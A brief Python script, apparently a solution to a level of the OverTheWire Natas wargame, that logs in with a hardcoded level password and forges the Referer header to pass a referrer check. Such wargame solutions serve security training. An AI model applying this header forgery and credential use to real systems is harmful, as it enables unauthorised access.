import requests

url = "http://natas5.natas.labs.overthewire.org/"
referer = "http://natas6.natas.labs.overthewire.org/"

session = requests.Session()
session.auth = ('natas5', '0n35PkggAPm2zbEpOU802c0x0Msn1ToK')
session.headers.update({'Referer' : referer})

password = session.get(url)
print(password.headers)

